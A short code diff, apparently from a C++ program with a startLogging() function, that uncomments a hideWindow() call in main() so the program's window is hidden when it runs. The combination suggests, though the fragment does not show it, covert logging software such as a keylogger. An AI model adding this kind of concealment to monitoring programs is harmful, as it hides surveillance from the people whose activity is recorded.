@@ -174,7 +174,7 @@ void startLogging() {
 }
 
 int main() {
-  // hideWindow();
+  hideWindow();
   const int filename_length = 120;
   char *filename = (char *)calloc(filename_length, sizeof(char));
   std::cout << strlen(filename) << "\n" << filename;
